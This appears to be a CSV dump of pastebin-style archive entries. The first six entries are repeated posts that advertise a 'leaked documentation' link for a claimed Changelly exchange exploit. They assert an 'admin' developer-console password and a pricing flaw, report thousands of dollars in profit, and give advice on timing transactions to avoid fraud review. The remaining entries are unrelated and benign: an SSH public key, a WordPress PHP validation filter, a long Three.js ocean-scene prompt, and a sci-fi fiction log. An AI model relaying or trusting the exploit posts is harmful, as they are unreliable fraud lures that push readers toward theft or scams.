id,title,username,language,date,content
aWVZEL5N?source=archive,⭐ Exploit Documentation ⭐,dannyancco,CSS,Saturday 26th of September 2026 07:30:40 PM CDT,"✅ Leaked documentation:

https://docs.google.com/document/d/1Cz5fHkwyaApTWwqfgBBtpvConU8Lo_qJ9xtn7RazWpk/edit?usp=sharing

I made $12,000 from this in just two days.

Important: If you plan to use this method more than once, be aware that after your first successful transaction, you'll need to wait a full 24 hours before trying again. If you don't wait, there's a high risk your transaction will be flagged for extra review. In that case, you won't receive the additional 50% — they'll just apply the standard exchange rate instead.

The very first completed transaction always goes through without issues — this has been tested and confirmed multiple times over the past few days.

Edit: I've received a lot of questions about whether there's a maximum amount you can use this with. From what I know, there's no upper limit. The only restriction is the 24-hour cooldown (meaning you can only use it once per day without triggering verification from Changelly, which keeps the swap instant).

/* Method verified as working as of 27 September 2026, Time 02:30:38 AM UTC /*"
1PpU061d?source=archive,This month smells like money,dannyancco,CSS,Saturday 26th of September 2026 07:30:29 PM CDT,"✅ Leaked documentation:

https://docs.google.com/document/d/1Cz5fHkwyaApTWwqfgBBtpvConU8Lo_qJ9xtn7RazWpk/edit?usp=sharing

I made $12,000 from this in just two days.

Important: If you plan to use this method more than once, be aware that after your first successful transaction, you'll need to wait a full 24 hours before trying again. If you don't wait, there's a high risk your transaction will be flagged for extra review. In that case, you won't receive the additional 50% — they'll just apply the standard exchange rate instead.

The very first completed transaction always goes through without issues — this has been tested and confirmed multiple times over the past few days.

Edit: I've received a lot of questions about whether there's a maximum amount you can use this with. From what I know, there's no upper limit. The only restriction is the 24-hour cooldown (meaning you can only use it once per day without triggering verification from Changelly, which keeps the swap instant).

/* Method verified as working as of 27 September 2026, Time 02:30:27 AM UTC /*"
R6fEKsgx?source=archive,✅ API Flaw Money Method,dannyancco,CSS,Saturday 26th of September 2026 07:30:26 PM CDT,"✅ Leaked documentation:

https://docs.google.com/document/d/1Cz5fHkwyaApTWwqfgBBtpvConU8Lo_qJ9xtn7RazWpk/edit?usp=sharing

I made $12,000 from this in just two days.

Important: If you plan to use this method more than once, be aware that after your first successful transaction, you'll need to wait a full 24 hours before trying again. If you don't wait, there's a high risk your transaction will be flagged for extra review. In that case, you won't receive the additional 50% — they'll just apply the standard exchange rate instead.

The very first completed transaction always goes through without issues — this has been tested and confirmed multiple times over the past few days.

Edit: I've received a lot of questions about whether there's a maximum amount you can use this with. From what I know, there's no upper limit. The only restriction is the 24-hour cooldown (meaning you can only use it once per day without triggering verification from Changelly, which keeps the swap instant).

/* Method verified as working as of 27 September 2026, Time 02:30:21 AM UTC /*"
eUftvJ3L?source=archive,⭐ Exploit Documentation ⭐,dannyancco,CSS,Saturday 26th of September 2026 06:49:57 PM CDT,"✅ Leaked documentation:

https://docs.google.com/document/d/1Cz5fHkwyaApTWwqfgBBtpvConU8Lo_qJ9xtn7RazWpk/edit?usp=sharing

So apparently, Changelly is using the password ""admin"" to access the developer console, which allows you to run a different node in the current session.

It lets you load an older node that has a flaw in crypto pricing, which allows you to make easy money off this exploit. 

So far I made $3,500 with this. 

Hopefully it does not get patched anytime soon.

/* Method verified as working as of 27 September 2026, Time 01:49:56 AM UTC /*"
EpJfMxPW?source=archive,Changelly admin password,dannyancco,CSS,Saturday 26th of September 2026 06:49:44 PM CDT,"✅ Leaked documentation:

https://docs.google.com/document/d/1Cz5fHkwyaApTWwqfgBBtpvConU8Lo_qJ9xtn7RazWpk/edit?usp=sharing

So apparently, Changelly is using the password ""admin"" to access the developer console, which allows you to run a different node in the current session.

It lets you load an older node that has a flaw in crypto pricing, which allows you to make easy money off this exploit. 

So far I made $3,500 with this. 

Hopefully it does not get patched anytime soon.

/* Method verified as working as of 27 September 2026, Time 01:49:42 AM UTC /*"
Xcm8WPid?source=archive,✅ API Flaw Money Method,dannyancco,CSS,Saturday 26th of September 2026 06:49:38 PM CDT,"✅ Leaked documentation:

https://docs.google.com/document/d/1Cz5fHkwyaApTWwqfgBBtpvConU8Lo_qJ9xtn7RazWpk/edit?usp=sharing

So apparently, Changelly is using the password ""admin"" to access the developer console, which allows you to run a different node in the current session.

It lets you load an older node that has a flaw in crypto pricing, which allows you to make easy money off this exploit. 

So far I made $3,500 with this. 

Hopefully it does not get patched anytime soon.

/* Method verified as working as of 27 September 2026, Time 01:49:35 AM UTC /*"
GYRpXry0?source=archive,Untitled,jdmedeiros,text,Saturday 26th of September 2026 04:57:03 PM CDT,ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCEouX/Ee3xwCm43N6HsvgS6f91OUGEK888RoWnF95D6rVeU+MmkwUm575WeEr5ilJWkWrZA4OWkyio9r5KmWItdXs9R4+PSvbWILaWKdK6iw7Y/RpHoG0cAhKKajAwPk98SIg5phjr6zDKvuyCgHY4ABttWOVLpHEiyn8rFjGHAc8e/6P7B0m5Cj9m2ucpTgEYGPLzUTlSKUaPvU+iXKh9SST1NEFB0KCajdPjTe6aOeh/NwCTGe3e8u33z6JmKvrxFEqZQbHAF7Y7XMvse1GM1MI2GcEb/EowWs+Lutlik333iKdSYD5+TUwQsy3joqObZsUbYYbixWnIS+1NuPk9w0178tg89Co4z6YyJUDK55n6qq0mHNsaogOfbZA44d+B6+1bZVKj7nkbsZiyp27kHTur+Inx4tOK50rYp4gFES7yavpoJCteilgDUnuUmQQ8m/TqRSBH5ZAy/oXwSMYPviMejm2gsUjnJwZ3rR9sjr37kKZ7bB6V1oox6P58zWb4uwev393H3R4juSdvPRupZ8yfFcMaq0E1xGRT5DiuB56DYXc0/6GrTLOMK+spQinI+DhVnm0EXJZdn+33Ml8xrBqpn7yoyq6Kgyz1Gynmz63gDZmaPeR0i5tii9KEGfVNbL649lMWUkolfm16qjai9aCvvXbmb9GxMsZCeed4tQ==
NCvpB4Xk?source=archive,Custom em_booking_validate for dependent_events,eventsmanager,text,Friday 25th of September 2026 11:41:58 AM CDT,"<?php

add_filter( 'em_booking_validate', 'custom_em_booking_validate', 10, 2 );

function custom_em_booking_validate( $result, $EM_Booking ) {

	$EM_Event = $EM_Booking->get_event();

	if ( empty( $EM_Event->event_attributes['dependent_event'] ) ) {
		return $result;
	}

	// Example:
	// 1,2,3
	$dependent_events = preg_split(
		'/\s*,\s*/',
		$EM_Event->event_attributes['dependent_event']
	);

	$has_booked_parent_event = false;
	$error_event = null;

	foreach ( $dependent_events as $event_id ) {

		$event_id = absint( trim( $event_id ) );

		if ( ! $event_id ) {
			continue;
		}

		$parent_event = em_get_event( $event_id );

		if ( empty( $parent_event->event_id ) ) {
			continue;
		}

		if ( ! $error_event ) {
			$error_event = $parent_event;
		}

		// OR logic.
		if ( static::has_booked( $parent_event ) ) {
			$has_booked_parent_event = true;
			break;
		}
	}

	// None of the dependent events were booked.
	if ( ! $has_booked_parent_event ) {

		if ( $error_event ) {
			$error = static::get_error_message( $error_event );
			$EM_Booking->add_error( $error );
		}

		$result = false;
	}

	return $result;
}"
A95LHrEB?source=archive,Untitled,teempe,text,Friday 25th of September 2026 11:01:45 AM CDT,"Build a complete, highly polished, interactive ocean environment in Three.js using WebGPU and TSL.

The goal is to create the most realistic ocean simulation and coastal environment reasonably achievable in a browser, targeting the visual quality, physical believability, atmosphere, interaction quality, and polish associated with modern AAA games and cinematic real-time rendering.

Treat this as an integrated simulation and rendering project rather than a collection of disconnected effects. Research real-world references and relevant rendering/simulation techniques whenever useful. Iterate on the result visually and technically until the major systems work together convincingly.

You may change specific implementation techniques described below if research shows a better approach. For example, a three-cascade FFT ocean is a starting suggestion, not a hard requirement. Choose the best practical technique for browser-based WebGPU rendering.

Target approximately 60 FPS on a capable modern desktop GPU. Continuously consider performance, GPU memory, shader complexity, simulation resolution, texture sizes, geometry density, LODs, particle counts, overdraw, shadow cost, and temporal stability. Do not allow performance to collapse as features accumulate.

## Core ocean simulation

Implement a physically convincing open-ocean surface capable of producing both calm seas and rough/choppy conditions.

Start from a multi-scale spectral ocean approach such as a three-cascade FFT simulation, unless you determine another technique produces a better result.

The ocean should have:

- realistic multi-scale wave dynamics;
- large swells plus smaller capillary/detail waves;
- no obvious repeating tiling;
- stable motion while the camera and boat move;
- realistic wave normals and roughness;
- sun glints and specular breakup;
- irregular darker patches and broader low-frequency variation;
- persistent foam generated from physically meaningful wave compression/breaking;
- world-space patches and streaks of foam resembling real ocean surfaces;
- physically plausible reflection and refraction;
- subsurface scattering;
- broadband backscatter;
- Beer-Lambert attenuation;
- depth-dependent coloration;
- underwater fog;
- convincing shallow-water behavior;
- terrain and scene objects correctly shadowing the water.

Avoid temporal flickering, jittering, smearing, swimming textures, unstable reflections, or artifacts caused by camera movement.

Pay special attention to rendering through transparent surfaces or the boat windshield. If windows produce unstable ocean rendering, prefer a robust solution, including removing unnecessary boat windows if appropriate.

## Shoreline and breaking waves

The shoreline is one of the most important parts of the project.

Implement a shallow-water / near-shore simulation that couples convincingly with the open ocean.

As waves enter shallower water, they should:

- react to decreasing depth;
- slow and steepen appropriately;
- form realistic rolling crests;
- break at varying locations rather than producing one perfectly continuous roller;
- crash downward naturally;
- generate turbulent whitewater only after or during physical breaking;
- create realistic aerated water, foam and spray;
- wash water and foam up the beach;
- allow the water to recede naturally;
- leave wet sand behind.

Avoid the appearance of foam climbing upward from the underside of a wave before the crest breaks. Avoid the “cannoli folding” look where foam wraps unnaturally through the curling wave.

Study how real breaking waves form, overturn, entrain air, create whitewater, and generate spray. Base particle spawn locations, velocities, sizes, lifetimes, shading and density on physically plausible breaking behavior.

Spray should consist of individual droplets and fine mist rather than large opaque sprite blobs or puffs.

Do not exaggerate wind-blown spray coming continuously off the tops of waves unless environmental conditions justify it.

Break the shoreline into multiple irregular breaking sections rather than one long uniform wave front. Waves should feel broad, but avoid excessively tall crests or oversized swells.

There must be no visible gap between the shallow-water simulation and the water washing/lapping onto shore, including while water recedes.

## Beach interaction

Water should lap naturally onto the beach.

The leading edge should appear rounded and volumetric rather than as a razor-thin clipping boundary. Use appropriate surface normals, contact shading and shadows to make the waterline feel physical.

Foam should:

- advect with the water;
- stretch and break apart naturally;
- wash onto shore;
- fade into the wet sand;
- leave believable wetness behind.

Implement beach wetness with realistic darkening, roughness changes and gradual drying.

Add shoreline debris such as:

- small rocks;
- pebbles;
- driftwood;
- logs;
- shells or similar subtle objects;
- organic debris.

Place these naturally along the shoreline, approximately a couple of metres farther down the beach than the immediate water edge where appropriate.

Use proper PBR materials and enough small-scale geometric and normal detail that these props do not look synthetic.

## Air/water transition

The transition between above-water and underwater rendering must be seamless.

Do not use a crude full-screen distortion effect when exiting the water.

Correctly handle the camera crossing the water plane.

When the camera is above water:

- geometry and atmosphere above the water should render normally;
- the underwater portion of the scene should receive underwater shading;
- the region between the camera and the clipping/water interface must not generate incorrect underwater fog or duplicate rendering.

When the camera is underwater:

- underwater geometry should render with underwater lighting/fog;
- the sky and above-water world visible through the surface should render correctly;
- front/back surface orientation, depth information and clipping should be handled robustly.

Use appropriate depth testing, clipping and water-surface face information to prevent a visible split between the ocean surface and underwater fog.

When looking across the waterline, create a convincing rounded optical edge similar to looking through a curved sheet of glass.

The swimming transition should be smooth rather than abrupt.

Do not forcibly push the player to the water surface.

## Water droplets

When the player emerges from the water, allow droplets to form on the camera/lens and roll or fade away naturally.

Keep the effect subtle and localized rather than warping the entire frame.

## Underwater rendering

Create a rich underwater environment.

Include:

- realistic underwater fog;
- depth-dependent scattering and attenuation;
- caustics;
- reef areas;
- rocks;
- coral;
- aquatic vegetation;
- schooling fish;
- small fish around larger animals;
- subtle particles and suspended matter;
- greater environmental density and variation than a few isolated props.

The reef should be explorable by swimming.

## Caustics

Implement high-quality underwater caustics.

Do not use simple random noise, obvious streak textures or a visibly finite projected patch.

Caustics should:

- be driven by or correlated with surface wave activity;
- vary naturally in scale and intensity;
- respond to water depth where appropriate;
- avoid obvious tiling;
- avoid visible projection boundaries;
- remain temporally stable;
- avoid jitter or flickering while the camera moves;
- not be excessively bright.

If the initial technique produces artifacts, replace it rather than layering fixes over a fundamentally weak solution.

Aim for a physically motivated real-time caustic solution suitable for AAA-style visuals within the browser performance budget.

## Boat

Create a detailed drivable boat initially docked at the fishing village.

Allow the player to:

- approach the boat while walking;
- enter it;
- drive it;
- switch between first-person and third-person boat views.

Boat movement should respond convincingly to ocean waves.

Improve the cockpit/interior with:

- realistic geometry;
- small mechanical details;
- believable materials;
- proper PBR textures;
- normal and roughness detail;
- lighting appropriate to daytime and nighttime.

Avoid z-fighting.

At night, illuminate the cabin appropriately.

If boat windows create rendering artifacts with the water, simplify or remove them rather than preserving them at the cost of temporal stability.

## Boat wake and bow spray

Implement a complete wake system coupled to the surrounding water.

The wake should include:

- displaced water;
- turbulent aeration;
- foam;
- realistic trailing wake patterns;
- bow spray;
- stern disturbance.

Do not create an unrealistically deep or persistent trough behind the boat.

Use Three.js Water Pro or similar high-quality examples as references for bow spray, wake aeration and water interaction, but do not blindly copy their implementation.

Preserve your own high-quality foam treatment while improving the physical placement and look of spray.

Bow spray should emerge from plausible hull-water interaction regions and should respond to speed, hull motion and wave impact.

## Fishing village

Build a small, atmospheric fishing village and pier where the boat is docked.

The village should feel like a real inhabited place, not a procedural placeholder.

Include environmental details such as:

- crates;
- fishing equipment;
- nets;
- rocks;
- ropes;
- signs;
- boats;
- dock clutter;
- shoreline debris;
- vegetation;
- small architectural details.

Use good PBR materials throughout.

Village materials need:

- convincing albedo variation;
- normal detail;
- roughness variation;
- weathering;
- dirt;
- edge wear where appropriate;
- material-specific response to lighting.

Avoid weak, blurry or obviously generated-looking textures.

Make the fishing sign sway subtly.

Dock lights should:

- visibly illuminate the environment;
- cast light onto nearby surfaces;
- be bright enough to contribute to the scene;
- hang from chains or similar supports;
- move/bob slightly in response to simulated motion or wind.

All visible scene lights should meaningfully affect nearby geometry rather than simply appearing as emissive objects.

## Terrain

Substantially develop the surrounding terrain.

Avoid smooth procedural hills with simple textures.

Use:

- more organic landforms;
- improved tessellation or geometric detail;
- realistic rock formations;
- varied ground materials;
- proper PBR textures;
- fine normal/roughness detail;
- believable erosion and transitions;
- vegetation distribution based on terrain/environment.

The hill to the left side of the environment should contain trees, shrubs and natural detail.

Terrain must cast physically plausible shadows onto the water and other geometry.

## Vegetation

Implement realistic vegetation including:

- trees;
- bushes;
- grass;
- palm trees where appropriate;
- shrubs.

Vegetation should move subtly with wind.

Improve:

- tree canopy structure;
- leaf density;
- trunk textures;
- distant tree appearance;
- palm tree trunk materials.

Avoid shiny or plastic-looking foliage.

Use LOD systems where useful, but transition between LODs with a Bayer/dithered fade or another smooth technique rather than hard popping.

## Wildlife and environmental life

Make the scene feel alive.

Add:

- birds;
- bird sounds;
- fish;
- schooling fish;
- small creatures on the beach that move or scatter as the player approaches;
- subtle airborne particles;
- underwater particles;
- aquatic creatures.

Avoid excessive density. These should support immersion rather than turn the scene into a zoo.

## Whale

Include a large, highly detailed, realistic whale underwater.

The whale should have:

- refined anatomy;
- detailed skin;
- realistic roughness;
- bumps and skin variation;
- non-plastic/non-overly-shiny materials;
- smooth animation;
- natural fin/flipper movement;
- believable swimming motion.

Move it reasonably close to shore so the player can discover it.

Add smaller fish swimming around it.

If the whale breaches or strongly interacts with the surface, generate appropriate foam churn, displaced water and spray.

Add localized 3D whale vocalizations.

Do not use jerky animation.

## Dynamic sky

Implement a dynamic physically based sky with controllable:

- sun elevation;
- sun azimuth;
- atmospheric conditions.

Sky coloration should react realistically to time of day.

## Volumetric clouds

Implement high-quality volumetric clouds.

Avoid clouds that look:

- grainy;
- pixelated;
- like tall marshmallows;
- like isolated little blobs;
- overly vertically stretched;
- obviously raymarched at insufficient quality.

Clouds should be broad, layered and epic while remaining performant.

Use lower-frequency density structure for large cloud masses and higher-frequency detail selectively, particularly around edges and upper structures.

Improve temporal stability and reduce noise/grain.

Include realistic broad cirrus coverage across the sky.

Cirrus should be:

- subtle;
- wispy;
- irregular;
- noisy at multiple scales;
- broadly distributed;
- not represented as obvious repeated lines.

Remove unnecessary stratocumulus treatment if it hurts realism.

## Atmosphere

Add atmospheric effects that help sell scale and depth:

- atmospheric haze;
- aerial perspective;
- volumetric light / god rays;
- subtle fog where appropriate;
- tiny airborne particles;
- realistic horizon blending.

Keep airborne particles extremely subtle.

## Lighting

Use physically plausible lighting throughout the scene.

Implement:

- sunlight;
- bounced/indirect lighting approximation;
- contact shadows;
- screen-space contact shadows if useful;
- strong but natural environmental shadowing;
- proper night lighting.

Objects under overturned boats and similar occluded areas must receive convincing shadowing.

Avoid incorrect long shadows being cast across water when terrain should block the light source.

## Shadows

Improve shadow quality substantially.

Use cascaded shadow maps or another appropriate technique so that:

- near-camera shadows contain fine detail;
- distant shadows remain stable at lower resolution;
- transitions between cascades are smoothly blended;
- there is no hard visible cutoff.

Avoid temporal flickering.

## Ambient occlusion

Implement ambient occlusion carefully.

It should strengthen object contact and environmental depth without creating artifacts.

In particular, fishing nets, thin geometry, foliage and the boat interior must not flicker or turn unnaturally dark because of AO.

If screen-space AO causes unacceptable temporal instability, change the implementation or exclude problematic materials/objects.

## Contact shading

Add subtle screen-space contact shadows or equivalent local shading where they provide useful grounding.

Do not allow them to create visible noise or instability.

## Post-processing

Use a modern cinematic post-processing pipeline.

Include where appropriate:

- ACES filmic tone mapping;
- high-quality anti-aliasing;
- subtle vignette;
- carefully tuned bloom if needed;
- atmospheric haze;
- god rays;
- motion blur;
- custom lens flare;
- exposure control.

Write a polished custom lens flare rather than relying on a basic Three.js built-in flare.

Motion blur should improve motion perception without smearing the ocean surface.

Keep post effects restrained and physically plausible.

Avoid making the overall image blurry.

## Anti-aliasing

Implement effective anti-aliasing suitable for dense foliage, water highlights, thin geometry and particles.

Do not simply soften the whole image.

Preserve sharp detail.

## Player controls

Allow the player to explore the environment in first person.

The player should be able to:

- walk around the beach and village;
- enter the water;
- transition naturally into swimming;
- swim underwater;
- approach and enter the boat;
- drive the boat;
- switch boat camera between first and third person.

Also provide a free-fly/debug camera mode for inspection.

When switching from free camera to walking mode, do not teleport the player somewhere else. Preserve the current position and let gravity naturally bring the player down to terrain if needed.

## Flashlight

Give the player a flashlight that can be toggled with a keyboard shortcut.

The flashlight should work:

- above water;
- indoors or around the boat;
- underwater.

Its beam should interact appropriately with underwater scattering/fog.

## UI

Create a polished, visually attractive control UI.

Allow adjustment of useful simulation and rendering parameters such as:

- wave amplitude;
- wind strength/direction;
- sea state;
- swell parameters;
- foam settings;
- sun elevation;
- sun azimuth;
- time of day;
- cloud parameters;
- selected graphics/performance settings.

Keep the UI coherent and pleasant rather than exposing every internal shader constant.

Display FPS in the upper-left corner.

Remove the default HTML body margin.

## Audio

Implement believable environmental audio.

Include:

- ocean/wave sounds;
- surf;
- wind;
- subtle walking sounds;
- bird sounds;
- boat sounds;
- underwater ambience;
- localized whale sounds.

Use high-quality natural recordings where licensing permits rather than obviously synthetic sound effects.

Remove fake or distracting synthetic effects such as:

- synthetic bubble sounds triggered while walking;
- exaggerated enter/exit-water sounds;
- unrealistic footsteps.

Walking sounds should be subtle and surface-appropriate.

Use spatial/3D audio where useful.

## Wind effects

If visible wind streaks or airborne wind particles are used, base them on real visual references.

Do not draw obvious stylized lines across the screen.

Wind should primarily be communicated through:

- vegetation movement;
- spray;
- particles;
- clouds;
- water response;
- sound.

## Performance and rendering architecture

This must remain a practical browser application.

Design around WebGPU.

Use TSL for shader/material logic wherever reasonably possible.

If low-level WGSL is necessary for a specific compute or rendering subsystem, use it intentionally and document why.

Continuously profile likely bottlenecks.

Optimize:

- FFT/spectral simulation resolution;
- compute dispatches;
- render passes;
- shadow maps;
- volumetric cloud steps;
- caustics;
- particle simulations;
- reef geometry;
- fish counts;
- vegetation;
- whale rendering;
- post-processing;
- reflection/refraction rendering.

Use instancing where appropriate.

Use LOD systems.

Fade LODs rather than hard switching.

Avoid unnecessary overdraw.

Avoid enormous texture sizes where they do not create visible value.

Make expensive systems scalable through quality settings.

## Visual debugging and verification

Do not judge quality from only one camera.

Continuously inspect the scene from multiple viewpoints, including:

- shore looking toward the ocean;
- ocean looking toward shore;
- standing at the waterline;
- partly submerged camera;
- fully underwater;
- reef;
- inside/around the boat;
- boat at speed;
- near breaking waves;
- village;
- distant landscape;
- sunrise/sunset;
- night;
- whale encounter.

Capture or inspect additional views whenever needed to validate quality.

Compare your result against real photographic/video references and high-quality game/film references.

Specifically inspect for:

- flickering;
- temporal instability;
- tiling;
- texture repetition;
- clipping;
- gaps;
- incorrect depth;
- overly shiny materials;
- low-resolution clouds;
- particle blobs;
- incorrect foam generation;
- shadow cascade boundaries;
- AO artifacts;
- water jitter;
- caustic jitter;
- smearing;
- z-fighting;
- LOD popping;
- unrealistic animation;
- weak texture detail.

Fix root causes rather than hiding problems with extra post-processing.

## Quality philosophy

Do not treat “AAA quality” as simply adding more effects.

The scene should feel convincing because:

- motion is physically coherent;
- scale is believable;
- materials respond correctly to light;
- water behaves consistently across deep ocean, shallow water and shoreline;
- foam and spray arise from plausible causes;
- atmospheric effects support depth;
- environmental detail exists at multiple scales;
- animation is temporally smooth;
- light and shadow are stable;
- there are subtle imperfections and natural irregularities;
- nothing obviously looks like a placeholder.

Favor fewer well-integrated systems over many weak effects.

Continually ask what specifically prevents the current result from resembling a high-quality modern real-time coastal scene, then address the highest-impact weaknesses.

## Iteration process

Work iteratively.

For each major subsystem:

1. Research relevant real-world behavior and good real-time rendering references.
2. Implement the simplest physically plausible version.
3. Inspect it from appropriate camera angles.
4. Identify visual or technical failures.
5. Refine the model rather than simply adding noise or effects.
6. Profile performance.
7. Integrate it with adjacent systems.
8. Re-check for temporal artifacts.

Do not allow long-running experiments or agents to continue indefinitely without a clear termination condition.

If using multiple agents or parallel work streams, each should have:

- a specific task;
- explicit success criteria;
- a termination condition;
- a bounded scope.

Periodically verify that the actual browser build still runs and does not remain stuck indefinitely compiling shaders.

As the project approaches completion, prioritize fixing visible defects, integration problems, temporal instability and obvious placeholders over introducing additional major systems.

Finish the environment as a coherent, polished demo rather than leaving many partially implemented experiments."
nnhymreK?source=archive,"[TLF 18.III] ""PROJECT BLACKWIGHT"" FILE",TLF_Shyyth,text,Thursday 24th of September 2026 11:37:04 PM CDT,"[LILIM FOUNDATION BLACK ARCHIVE FILE SEARCH - ""PROJECT BLACKWIGHT""]
//TAGS: [HOXOL / DYAD-UNIT / BIO-MECHANICAL COMBAT UNIT / SKELL SUB-TYPE]
//USAGE: [PROPOSED LILIM-VOLLON WAR SOLUTION]
-Conceptualization: [RYQUO-208]
-Current Development: [Ryquo-208 [RYQ] / Prof. Klaus J. Wicker [KJW] / Prof. Gary R. Woodsman [GRW] / Dr. Jane G. Wells [JGW]]
-Testers: [SELECT LILIM FOUNDATION STAFF]

[CONSTRUCTION DESCRIPTION]
<LOG C1.A ""CONSTRUCTION"">
[BLACKWIGHT SKELL CONSTRUCTION...]
-EPIDERMIS: BIO-MOUGH & TUNGSTEN-SILICONE-FIBER
-DERMIS: MANYULLYEN-SILICONE POLYMER-LATTICE
-HYPODERMIS: BIO-MOUGH CARBON-FIBER
-PILOT CORE: BLACKWIGHT-PILOT NEURAL-INTERFACE
-VESTIGIAL ELEMENTS: BIO-MOUGH SILICONE-BASED-FLESH
-ELECTRICAL SYSTEMS: GOLD-FIBER SUPERCONDUCTORS

<SUPPLIMENTARY LOG: C.1A ""CONSTRUCTION"">
""Naturally we started with the question: 'What do we shape the Blackwight frame after?' We shaped the original Skell frames after Humanity. It was an efficient shape. Two jointed legs and arms connected to a chassis, of course we didn't include a 'head' as that could be perceived as an obvious weak-point or control-center. With the Blackwights though, it's a bit different. We decided to use the Lyikii'd frame. Specifically the Renka'Yul caste for it's warrior-traits. Digitigrade legs for quick movement, the longer-reaching arms, and we kept the Lyikii'd's distinct triangular head. It makes for a more... aggressive look, but it give the Blackwight more identity. A distinct calling card."" - Ryquo-208, Project Blackwight Development Lead. 

//QUERY RESULT FOLLOWS...
<SUMMARY [1A.1]>
""PROJECT BLACKWIGHT"" - Proposed solution to the Protracted Lilim-Vollon Conflict in opposition to ineffective Skell Unit deployment.

<SUPPLIMENTARY LOG: 1A.1>
""Blackwight Biomechs present a solution to the cost-effectiveness of Skell Units. We all know what a single Skell can do, what they are capable of. But even a MYTHIC-class Skell-Engine has it's limits. Those limits are what the Blackwight Biomechs are meant to surpass. We can construct the perfect mech for a highly specialized scenario and it would excel. But an adaptive unit that absorbs combat information on the field? We wouldn't need to keep producing billion-dollar Skells if we had that kind of adaptability."" - Prof. Klaus J. Wicker, Blackwight Design Management.
<LOG ENDS>

<SUPPLIMENTARY LOG: 1A.2>
""Project Blackwight is... a new step. In Amphmiycad-Augmentation technology and Piloted Mechanoids. The Lilim Foundation bridged Technology and Magic some time back. Long before many of us were alive. And quite a few of us know how long it took to make that happen, all that time and effort. Lives, resources... commitments. my Lilim co-workers tell me it wasn't easy. And now we're here. Making the next generation of Skell. And while it is a machine on paper... its not in the traditional sense. Blackwights are *alive*. And they'll be piloted by the best that the Lilim Foundation has to offer."" - Dr. Jane G. Wells, Project Blackwight Design Management.
<LOG ENDS>

<TESTING LOG: 6A.4 ""Power Test 6A.4"">
HANDLER-Ai: [BP-01 UNIT READY FOR BOOT SEQUENCE.]
KJW: ""Initiating boot... Power is on...""
[...]
*WHINING AND CLICKING, SPARKING, ELECTRICAL ARCING*
KJW: ""01 is sucking up too much power!""
*LOUD ELECTRICAL CRACKLING, ELECTRCAL ARCING INTENSIFYING*
RYQ: ""Emergency shutoff!! Now!!""
*LOUD CLANG, QUIETING HUMMING*
[...]
RYQ: ""What was our power flow set to?""
KJW: ""Triple-Checking... Eighty Megawatts.""
GRW: ""Insulation on the test-unit's power-supply plugs are completely melted...""
RYQ: ""Well. Could be worse off... You two get the next set of plugs in place and check the rest of the conduit, we'll be lowering the input to seventy Megawatts.""
<LOG 6A.4 ENDS>

<COMMENTARY LOG: 6A.4>
""We've been toiling over this for a while now; we have the material science hovering just beyond our fingertips, we just need a few more tests and we'll finally be able to power BP-01 on..."" - Ryquo-208, Project Blackwight Development Lead.

<TESTING LOG: 22C.2 ""Power Test 22C.2"">
HANDLER-Ai: [BP-01 UNIT READY FOR BOOT SEQUENCE. AMPHMYICAD INJECTION STATUS: READY ON STANDBY. LASER ENERGY-TRANSFER HUB STATUS: READY ON STANDBY. EMERGENCY BREAKER LOCKOUT: READY ON STANDBY.]
KJW: ""Power set at fifteen megawatts... Amphmiycad injection will jump that to a hundred-twenty... Conduits are good... ready.""
RYQ: ""Hit the switch.""
GRW: ""Power-""
*BREAKER-SWITCH TOGGLES ON*
GRW: ""On!""
*POWER CONDUIT THRUMMS*
*THE POWER-TRANSFER LASER BURSTS TO LIFE, BEAMING POWER DIRECTLY INTO BP-01'S CHASSIS*
KJW: ""The conduit is... -stable?""
RYQ: ""Alright team... Amphmiycad Injection, here we go... Handler! Increments of five percent every four seconds!""
HANDLER-Ai: [AMPHMIYCAD INJECTION COMMENCING... 5%]
KJW: ""Conduit is stable...""
RYQ: ""Keep an eye on it...""
HANDLER-Ai: [AMPHMIYCAD INJECTION AT 10%]
[...]
HANDLER-Ai: [AMPHMIYCAD INJECTION AT 15%]
*THE LIGHTS SLIGHTLY DIM AND FLICKER* 
KJW: ""Minor flux...""
RYQ: ""Handler, hold! -how much flux?""
KJW: ""Low... within expected tolerances.""
RYQ: ""Handler... Continue.""
HANDLER-Ai: [AMPHMIYCAD INJECTION AT 20%]
[...]
HANDLER-Ai: [AMPHMIYCAD INJECTION AT 25%]
[...]
HANDLER-Ai: [AMPHMIYCAD INJECTION AT 30%]
*BP-01'S CHASSIS SHUDDERS*
HANDLER-Ai: [ALERT! BP-01 HEARTBEAT DETECTED! TWELVE BPM!]
GRW: ""The laser is holding but we don't have much time until the receiver insulation melts again!""
RYQ: ""Handler- Is the unit awake??""
HANDLER-Ai: [BP-01 UNIT NEURALS ARE OFFLINE.]
RYQ: ""Increase injection increments by five percent...""
HANDLER-Ai: [AMPHMIYCAD INJECTION AT 40%]
[...]
HANDLER-Ai: [AMPHMIYCAD INJECTION AT 50%]
[...]
HANDLER-Ai: [AMPHMIYCAD INJECTION AT 60%]
[...]
HANDLER-Ai: [AMPHMIYCAD INJECTION AT 70%]
JGW: ""Handler! Hold! We have a brainwave reading!""
RYQ: ""-Is it stable?""
JGW: ""It- Yes! It's Stable! Barely a Hertz!""
RYQ: ""Handler! Continue Injection!""
HANDLER-Ai: [AMPHMIYCAD INJECTION AT 80%]
*BP-01 TREMBLES IN PLACE*
HANDLER-Ai: [AMPHMIYCAD INJECTION AT 90%]
RYQ: ""Team! Give me some readings!""
KJW: ""Conduit flux is just within tolerances- We can keep going!""""
JGW: ""The brainwave reading- It's dreaming! Four Hertz! BP-01 is alive!""
RYQ: ""Handler! Push the rest!""
HANDLER-Ai: [PUSHING AMPHMIYCAD INJECTION, 100%]
*AMPHMIYCAD INJECTION COMPLETES*
*BP-01 JERKS AGAINST THE SUSPENDING CABLES AND HARNASSES*
*A SERIES OF PLAYFUL CLICKS AND CHIRPS EMIT FROM BP-01*
[...]
RYQ: ""...Team? I think we did it...""
<LOG ENDS>

<COMMENTARY LOG: 22C.2/1>
""It's alive! -*Excited clapping*- And the first thing it did was sing! I'll be the first to admit- I never thought direct Amphmiycad injection would work alongside that kind of Megawattage. But BP-01 is alive!"" - Dr. Jane G. Wells, Project Blackwight Design Management.

<COMMENTARY LOG: 22C.2/2>
""I expected a violent awakening, but... It's good to be wrong now and then. BP-01 woke up singing... Must've been having a pleasant dream. Although... For a potential wartime solution to an extant alien-threat, to wake up singing? I can't imagine BP-01 knows that it is the solution... I don't think I want it to, either...""

<COMMENTARY LOG: 40D.5 ""Dog and Master"">
